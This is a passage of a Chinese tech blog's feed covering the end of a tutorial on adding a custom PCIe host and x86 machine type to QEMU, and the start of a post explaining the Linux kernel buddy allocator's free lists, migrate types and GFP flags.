class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br><br>    dc-&gt;realize = a3_pc_pcie_host_realize;<br>    set_bit(DEVICE_CATEGORY_BRIDGE, dc-&gt;categories);<br>    device_class_set_props(dc, a3_pc_pcie_host_props);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_pcie_host = &#123;<br>    .name = TYPE_A3_PC_PCIE_HOST,<br>    .parent = TYPE_PCI_HOST_BRIDGE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCPCIEHost),<br>    .instance_init = a3_pc_host_init,<br>    .class_init = a3_pc_class_init,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_host_register</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register(&amp;a3_pc_pcie_host);<br>&#125;<br><br>type_init(a3_pc_pcie_host_register);<br></code></pre></td></tr></table></figure><blockquote><p>修改文件：hw/pci-host/meson.build</p><blockquote><p>老版本没测了，自己想该怎么改吧（笑）</p></blockquote></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs meson"># A3 devices<br>pci_ss.add(when: &#x27;CONFIG_PCI&#x27;, if_true: files(&#x27;a3pc.c&#x27;))<br></code></pre></td></tr></table></figure><p>之后我们在我们的机器类型中加上 PCI 相关的两个指针成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineState parent;<br><br>    <span class="hljs-comment">/* &lt;public&gt; */</span><br><br>    <span class="hljs-comment">/* State for other subsystems/APIs: */</span><br>    Notifier machine_done;<br><br>    <span class="hljs-comment">/* Pointers to devices and objects: */</span><br>    PCIBus *bus;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * QEMU requires the entire PCI(e) hierarchy be attached to</span><br><span class="hljs-comment">     * a PCI(e) bus, so BES-VNC machine has to implement one.</span><br><span class="hljs-comment">     */</span><br>    PCIHostState *pci;<br>&#125; A3PCMachineState;<br></code></pre></td></tr></table></figure><p>最后在机器初始化函数中初始化一个我们自定义的这个 PCIe 设备即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br>    DeviceState *dev = qdev_new(TYPE_A3_PC_PCIE_HOST);<br><br>    sysbus_realize_and_unref(SYS_BUS_DEVICE(dev), &amp;error_fatal);<br>    ms-&gt;pci = PCI_HOST_BRIDGE(dev);<br><br>    memory_region_add_subregion(get_system_memory(), <span class="hljs-number">0</span>,<br>                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), <span class="hljs-number">0</span>));<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意新版本和老版本的 API 不同，在老版本中应当使用如下 API：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br><br>    DeviceState *dev = qdev_create(<span class="hljs-literal">NULL</span>, TYPE_A3_PC_PCIE_HOST);<br><br>    qdev_init_nofail(dev);<br>    ms-&gt;pci = PCI_HOST_BRIDGE(dev);<br><br>    memory_region_add_subregion(get_system_memory(), <span class="hljs-number">0</span>,<br>                                sysbus_mmio_get_region(SYS_BUS_DEVICE(dev), <span class="hljs-number">0</span>));<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br></code></pre></td></tr></table></figure><p>完成这些步骤之后我们的新机器就能随意插入各种 PCI 设备了；）</p><h3 id="II、添加新的-CPU-插槽🕊">II、添加新的 CPU 插槽🕊</h3><p>当然，我们的机器还缺少了 CPU，没有 CPU 的机器自然是跑不起来的，因此这里我们还需要在我们的机器类型当中添加上相应的 CPU 插槽，由于 Qemu 内部的基础 x86 机器架构已经实现好了基础框架，所以我们直接改为继承自对应的 x86 基础机器类即可</p><blockquote><p>当然，如果是纯纯自定义的异架构，这里还是得自己手动写一套…</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    X86MachineState parent;<br><br>    <span class="hljs-comment">/* &lt;public&gt; */</span><br><br>    <span class="hljs-comment">/* State for other subsystems/APIs: */</span><br>    Notifier machine_done;<br><br>    <span class="hljs-comment">/* Pointers to devices and objects: */</span><br>    PCIBus *bus;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * QEMU requires the entire PCI(e) hierarchy be attached to</span><br><span class="hljs-comment">     * a PCI(e) bus, so BES-VNC machine has to implement one.</span><br><span class="hljs-comment">     */</span><br>    PCIHostState *pci;<br>&#125; A3PCMachineState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    X86MachineClass parent;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br><br>    <span class="hljs-comment">/* Default CPU model version.  See x86_cpu_set_default_version(). */</span><br>    <span class="hljs-type">int</span> default_cpu_version;<br>&#125; A3PCMachineClass;<br></code></pre></td></tr></table></figure><p>不过机器定义的文件当中需要改动的部分会比预想的要多，<s>所以这里就先🕊🕊🕊了</s></p><h3 id="Extra-自定义-CPU-🕊">Extra.自定义 CPU 🕊</h3><blockquote><p>🕊🕊🕊</p></blockquote><h2 id="四、编译运行🕊">四、编译运行🕊</h2><p>由于我们新建立的机器类型为 <code>x86</code> 架构的机器，因此我们需要在执行 configure 脚本时指定 <code>--target-list=x86_64-softmmu</code></p><p>这里需要注意的是前前面笔者提供了两种设置 <code>CONFIG_A3_PC</code> 的选项：如果我们是直接通过修改 <code>default.mak</code> 使得 <code>CONFIG_A3_PC=y</code>，则直接编译即可；若我们是通过修改了 <code>configure</code> 来指定 <code>CONFIG_A3_PC</code> 的值，则创建编译脚本的时候我们需要手动指定 <code>--enable-a3-pc</code> 来编译上我们新增的机器类型</p><p>编译完成后我们便能够看到我们新添加的机器类型 <code>a3-pc</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">build$ </span><span class="language-bash">./qemu-system-x86_64 -machine ?</span><br>Supported machines are:<br>microvm              microvm (i386)<br>pc                   Standard PC (i440FX + PIIX, 1996) (alias of pc-i440fx-7.0)<br>pc-i440fx-7.0        Standard PC (i440FX + PIIX, 1996) (default)<br><span class="hljs-meta prompt_">#</span><span class="language-bash">...</span><br>a3-pc                (null)<br></code></pre></td></tr></table></figure><blockquote><p>🕊🕊🕊</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;不如 VMWare👋&lt;/p&gt;</summary>
    
    
    
    <category term="VIRTUALIZATION" scheme="http://blog.arttnba3.cn/categories/VIRTUALIZATION/"/>
    
    
    <category term="学习札记" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="PCI" scheme="http://blog.arttnba3.cn/tags/PCI/"/>
    
    <category term="虚拟化" scheme="http://blog.arttnba3.cn/tags/%E8%99%9A%E6%8B%9F%E5%8C%96/"/>
    
    <category term="Qemu" scheme="http://blog.arttnba3.cn/tags/Qemu/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x03】Linux内核内存管理II - Buddy System</title>
    <link href="http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/"/>
    <id>http://blog.arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/</id>
    <published>2022-06-30T15:44:49.000Z</published>
    <updated>2023-01-20T04:58:47.801Z</updated>
    
    <content type="html"><![CDATA[<p>HEY DUDE!</p><span id="more"></span><h1>0x00.一切开始之前</h1><p>在<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/">上一篇文章</a>中笔者简要阐述了 Linux 内核当中内存的基本组织架构：页、区、节点，在本篇文章当中笔者将阐述内核中最<strong>基础</strong>的内存分配器——<strong>Buddy Systen</strong>（伙伴系统）</p><blockquote><p>通过读取 <code>/proc/buddyinfo</code> 可以获取当前系统中 buddy system 的详细信息</p><p><img src="https://i.loli.net/2021/11/30/eRiVXpyUkncYZus.png" alt="image.png"></p><blockquote><p>笔者的💻配置比较🚮，所以只有一个 node，非常抱歉…</p></blockquote></blockquote><blockquote><p>这篇文章其实很早就写了个框架了，但是后面一直没有来得及进行补完…（其实就是懒而已吧（恼））</p><p><img src="https://s2.loli.net/2022/06/08/7VaQ6riZOcmDuEg.png" alt="image.png"></p></blockquote><h1>0x01.buddy system 中的内存组织形式</h1><h2 id="zone-中的-free-area-结构体数组">zone 中的 free_area 结构体数组</h2><p>前文中我们讲到，每个 zone 结构体中都有一个 free_area 结构体数组，用以存储 buddy system <strong>按照 order 管理的页面</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span><span class="hljs-title">free_area</span>[<span class="hljs-title">MAX_ORDER</span>];</span><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>其中的 <code>MAX_ORDER</code> 为一个常量，值为 11</p><p>在 buddy system 中按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为<strong>连续的空闲页面的大小</strong>，不过单位不是页面数，而是<code>阶</code>，即对于每个下标而言，其中所存储的页面大小为：<br>$$<br>2^{order}<br>$$<br>在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构，由此我们得到这样一张_Overview_：</p><p><img src="https://i.loli.net/2021/11/30/sOwdI5YMNUjLSib.png" alt="自己画的图.png"></p><p>下面我们来解析 <code>free_area</code> 的具体结构，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">free_area</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">free_list</span>[<span class="hljs-title">MIGRATE_TYPES</span>];</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>nr_free;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="free-list：空闲页面双向链表">free_list：空闲页面双向链表</h3><p>我们不难看出：free_area 的 free_list 字段便是用以存放指向空闲页面的指针，其通过 page 结构体的 <code>lru</code> 字段将 page 结构体连接成双向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> &#123;</span><br>    <span class="hljs-comment">//...</span><br>    <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><span class="hljs-comment">/* 页缓存与匿名页 */</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * @lru: Pageout 链表, 例如 active_list 便由</span><br><span class="hljs-comment"> * lruvec-&gt;lru_lock 保护。  </span><br><span class="hljs-comment"> * 有时会被页所有者作为常规链表使用。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">lru</span>;</span><br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>page 结构体中的 <code>lru</code> 这一字段的类型为 <code>struct list_head</code>，这是内核编程中通用的双向链表结构，<strong>free_list 与 lru 链表都使用该字段</strong> 将页结构体组织为_双向链表_，即_一个页是不可能同时出现在 lru 链表与 buddy system 中的_</p><h4 id="迁移类型分链表"><em>迁移类型分链表</em></h4><p>在这里我们注意到free_area 中<strong>并非只有一个双向链表</strong>，而是按照不同的“迁移类型”（migrate type）进行分开存放，这是由于_页面迁移_机制的存在</p><p>页面迁移主要用以解决内核空间中的<strong>碎片问题</strong>，在长期的运行之后内存当中空闲页面的分布可能是零散的，这便导致了内核<strong>有可能无法映射到足够大的连续内存</strong>，因此需要进行_页面迁移_——将旧的页面迁移到新的位置</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="从知乎偷的图.png"></p><p>但<strong>并非所有的页面都是能够随意迁移的</strong>，因此我们在 buddy system 当中还需要将页面按照迁移类型进行分类</p><p>迁移类型由一个枚举类型定义，定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">migratetype</span> &#123;</span><br>MIGRATE_UNMOVABLE,<br>MIGRATE_MOVABLE,<br>MIGRATE_RECLAIMABLE,<br>MIGRATE_PCPTYPES,<span class="hljs-comment">/* the number of types on the pcp lists */</span><br>MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_CMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * MIGRATE_CMA migration type is designed to mimic the way</span><br><span class="hljs-comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span><br><span class="hljs-comment"> * from MIGRATE_CMA pageblocks and page allocator never</span><br><span class="hljs-comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The way to use it is to change migratetype of a range of</span><br><span class="hljs-comment"> * pageblocks to MIGRATE_CMA which can be done by</span><br><span class="hljs-comment"> * __free_pageblock_cma() function.  What is important though</span><br><span class="hljs-comment"> * is that a range of pageblocks must be aligned to</span><br><span class="hljs-comment"> * MAX_ORDER_NR_PAGES should biggest page be bigger then</span><br><span class="hljs-comment"> * a single pageblock.</span><br><span class="hljs-comment"> */</span><br>MIGRATE_CMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span><br>MIGRATE_ISOLATE,<span class="hljs-comment">/* can&#x27;t allocate from here */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>MIGRATE_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><strong>MIGRATE_UNMOVABLE</strong>：这类型页面在内存当中有着固定的位置，<strong>不能移动</strong></li><li><strong>MIGRATE_MOVABLE</strong>：这类页面<strong>可以随意移动</strong>，例如用户空间的页面，我们只需要复制数据后改变页表映射即可</li><li><strong>MIGRATE_RECLAIMABLE</strong>：这类页面<strong>不能直接移动，但是可以删除</strong>，例如映射自文件的页</li><li><strong>MIGRATE_PCPTYPES</strong>：<code>per_cpu_pageset</code>，即每 CPU 页帧缓存，其迁移<strong>仅限于同一节点内</strong></li><li><strong>MIGRATE_CMA</strong>：<code>Contiguous Memory Allocator</code>，即<strong>连续的物理内存</strong></li><li><strong>MIGRATE_ISOLATE</strong>：<strong>不能从该链表分配页面</strong>，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点</li><li><em>MIGRATE_TYPES</em>：表示迁移类型的数目，<em>并不存在这一链表</em></li></ul><p>以 <em>free_list[0]</em> 作为例子，我们可以得到如下 overview：</p><p><img src="https://i.loli.net/2021/11/30/sbNImKo6tBS5GUe.png" alt="自己画的图.png"></p><h3 id="nr-free：空闲页面（块）计数">nr_free：空闲页面（块）计数</h3><p>该字段记录了在当前 free_area 中的空闲页面块的数量，对于 free_area[0] 以外的 free_area 而言其单位并非是单个页框，而是以_内存块_为单位</p><h1>0x02.页的分配</h1><p>buddy system 提供了一组用以进行页面分配的接口，接下来笔者将以自底向上的方式进行源码分析</p><h2 id="一、GFP（get-free-page）标志位">一、GFP（get free page）标志位</h2><blockquote><p>GFP标志位这一节基本上搬运自<a href="https://blog.csdn.net/yhb1047818384/article/details/112298996">这篇文章</a></p></blockquote><p>在 kernel memory allocation 中我们经常能见到 <code>gfp_t</code> 类型，其表示分配时的标志位，定义在 <code>include/linux/gfp.h</code> 中，大概有如下这些可用标志位：</p><ul><li><strong>内存管理区修饰符 (zone modifiers)</strong></li></ul><p>内存管理区修饰符主要描述从哪些内存管理区来分配内存</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">__GFP_DMA</td><td style="text-align:left">从ZONE_DMA区中分配内存</td></tr><tr><td style="text-align:left">__GFP_HIGNMEM</td><td style="text-align:left">从ZONE_HIGHMEM区中分配内存</td></tr><tr><td style="text-align:left">__GFP_DMA32</td><td style="text-align:left">从ZONE_DMA32区中分配内存</td></tr><tr><td style="text-align:left">__GFP_MOVABLE</td><td style="text-align:left">内存规整时可以迁移或回收页面</td></tr></tbody></table><ul><li><strong>移动和替换修饰符(mobility and placement modifiers)</strong></li></ul><p>移动和替换修饰符主要表示分配出来的页面具有的迁移属性</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">__GFP_RECLAIMABLE</td><td style="text-align:left">分配的内存页面可以回收</td></tr><tr><td style="text-align:left">__GFP_WRITE</td><td style="text-align:left">申请的页面会被弄成脏页</td></tr><tr><td style="text-align:left">__GFP_HARDWALL</td><td style="text-align:left">强制使用cpuset内存分配策略</td></tr><tr><td style="text-align:left">__GFP_THISNODE</td><td style="text-align:left">在指定的节点上分配内存</td></tr><tr><td style="text-align:left">__GFP_ACCOUNT</td><td style="text-align:left">kmemcg会记录分配过程</td></tr></tbody></table><ul><li><strong>水位修饰符 （watermark modifiers）</strong></li></ul><p>与水位线相关的标志位</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">__GFP_ATOMIC</td><td style="text-align:left">高优先级分配内存，分配器可以分配最低警戒水位线下的预留内存</td></tr><tr><td style="text-align:left">__GFP_HIGH</td><td style="text-align:left">分配内存的过程中不可以睡眠或执行页面回收动作</td></tr><tr><td style="text-align:left">__GFP_MEMALLOC</td><td style="text-align:left">允许访问所有的内存</td></tr><tr><td style="text-align:left">__GFP_NOMEMALLOC</td><td style="text-align:left">不允许访问最低警戒水位线下的系统预留内存</td></tr></tbody></table><ul><li><strong>页面回收修饰符（reclaim modifiers)</strong></li></ul><p>与页面回收相关的标志位</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">__GFP_IO</td><td style="text-align:left">启动物理I/O传输</td></tr><tr><td style="text-align:left">__GFP_FS</td><td style="text-align:left">允许调用底层FS文件系统。可避免分配器递归到可能已经持有锁的文件系统中， 避免死锁</td></tr><tr><td style="text-align:left">__GFP_DIRECT_RECLAIM</td><td style="text-align:left">分配内存过程中可以使用直接内存回收</td></tr><tr><td style="text-align:left">__GFP_KSWAPD_RECLAIM</td><td style="text-align:left">内存到达低水位时唤醒kswapd线程异步回收内存</td></tr><tr><td style="text-align:left">__GFP_RECLAIM</td><td style="text-align:left">表示是否可以直接内存回收或者使用kswapd线程进行回收</td></tr><tr><td style="text-align:left">__GFP_RETRY_MAYFAIL</td><td style="text-align:left">分配内存可以可能会失败，但是在申请过程中会回收一些不必要的内存，是整个系统受益</td></tr><tr><td style="text-align:left">__GFP_NOFAIL</td><td style="text-align:left">内存分配失败后无限制的重复尝试，知道分配成功</td></tr><tr><td style="text-align:left">__GFP_NORETRY</td><td style="text-align:left">直接页面回收或者内存规整后还是无法分配内存时，不启用retry反复尝试分配内存，直接返回NULL</td></tr></tbody></table><ul><li><strong>行为修饰符 (action modifiers)</strong></li></ul><p>与分配时的行为相关的标志位</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">__GFP_NOWARN</td><td style="text-align:left">关闭内存分配过程中的WARNING</td></tr><tr><td style="text-align:left">__GFP_COMP</td><td style="text-align:left">分配的内存页面将被组合成复合页compound page</td></tr><tr><td style="text-align:left">__GFP_ZERO</td><td style="text-align:left">返回一个全部填充为0的页面</td></tr></tbody></table><ul><li><strong>组合类型标志(Useful GFP flag combinations)</strong></li></ul><p>前面描述的修饰符种过于繁多，因此linux定义了一些组合的类型标志，供开发者使用。</p><table><thead><tr><th style="text-align:left">flag</th><th style="text-align:left">element</th><th style="text-align:left">description</th></tr></thead><tbody><tr><td style="text-align:left">GFP_ATOMIC</td><td style="text-align:left">__GFP_HIGH |__GFP_ATOMIC |__GFP_KSWAPD_RECLAIM</td><td style="text-align:left">分配过程不能休眠，分配具有高优先级，可以访问系统预留内存</td></tr><tr><td style="text-align:left">GFP_KERNEL</td><td style="text-align:left">__GFP_RECLAIM |__GFP_IO |__GFP_FS</td><td style="text-align:left">分配内存时可以被阻塞(即休眠)</td></tr><tr><td style="text-align:left">GFP_KERNEL_ACCOUNT</td><td style="text-align:left">GFP_KERNEL |__GFP_ACCOUNT</td><td style="text-align:left">和GFP_KERNEL作用一样，但是分配的过程会被kmemcg记录</td></tr><tr><td style="text-align:left">GFP_NOWAIT</td><td style="text-align:left">__GFP_KSWAPD_RECLAIM</td><td style="text-align:left">分配过程中不允许因直接内存回收而导致停顿</td></tr><tr><td style="text-align:left">GFP_NOIO</td><td style="text-align:left">__GFP_RECLAIM</td><td style="text-align:left">不需要启动任何的I/O操作</td></tr><tr><td style="text-align:left">GFP_NOFS</td><td style="text-align:left">__GFP_RECLAIM |__GFP_IO</td><td style="text-align:left">不会有访问任何文件系统的操作</td></tr><tr><td style="text-align:left">GFP_USER</td><td style="text-align:left">__GFP_RECLAIM |__GFP_IO |__GFP_FS |__GFP_HARDWALL</td><td style="text-align:left">用户空间的进程分配内存</td></tr><tr><td style="text-align:left">GFP_DMA</td><td style="text-align:left">__GFP_DMA</td><td style="text-align:left">从ZONE_DMA区分配内存</td></tr><tr><td style="text-align:left">GFP_DMA32</td><td style="text-align:left">__GFP_DMA32</td><td style="text-align:left">从ZONE_DMA32区分配内存</td></tr><tr><td style="text-align:left">GFP_HIGHUSER</td><td style="text-align:left">GFP_USER | __GFP_HIGHMEM</td><td style="text-align:left">用户进程分配内存，优先使用ZONE_HIGHMEM， 且这些页面不允许迁移</td></tr><tr><td style="text-align:left">GFP_HIGHUSER_MOVABLE</td><td style="text-align:left">GFP_HIGHUSER | __GFP_MOVABLE</td><td style="text-align:left">和GFP_HIGHUSER类似，但是页面可以迁移</td></tr><tr><td style="text-align:left">GFP_TRANSHUGE_LIGHT</td><td style="text-align:left">GFP_HIGHUSER_MOVABLE | __GFP_COMP | __GFP_NOMEMALLOC | __GFP_NOWARN) &amp; ~__GFP_RECLAIM</td><td style="text-align:left">透明大页的内存分配， light表示不进行内存压缩和回收</td></tr><tr><td style="text-align:left">GFP_TRANSHUGE</td><td style="text-align:left">GFP_TRANSHUGE_LIGHT | __GFP_DIRECT_RECLAIM</td><td style="text-align:left">和GFP_TRANSHUGE_LIGHT类似，通常khugepaged使用该标志</td></tr></tbody></table><h2 id="二、alloc-context-结构体：分配的上下文">二、alloc_context 结构体：分配的上下文</h2><p>这是一个分配过程中非常重要的结构体，用来表示我们单次内存分配的上下文信息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 用以保存在分配时涉及到的函数间传递的</span><br><span class="hljs-comment"> * 绝大部分的不可变的分配参数的结构体，</span><br><span class="hljs-comment"> * 包括 alloc_pages 函数族</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * nodemask, migratetype 与 highest_zoneidx 仅在</span><br><span class="hljs-comment"> * __alloc_pages_nodemask() 中被初始化一次，之后不再改变.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist, preferred_zone 与 highest_zoneidx 最初在</span><br><span class="hljs-comment"> * __alloc_pages_nodemask() 中为快速路径设置, 之后可能会在</span><br><span class="hljs-comment"> * __alloc_pages_slowpath() 中被改变. 其他所有的函数通过</span><br><span class="hljs-comment"> * 常量指针传递该结构体。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> *<span class="hljs-title">zonelist</span>;</span><br><span class="hljs-type">nodemask_t</span> *nodemask;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> *<span class="hljs-title">preferred_zoneref</span>;</span><br><span class="hljs-type">int</span> migratetype;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * highest_zoneidx 表示分配请求中最高的可用 zone 的下标。</span><br><span class="hljs-comment"> * 由于 zone 的性质, 相较于 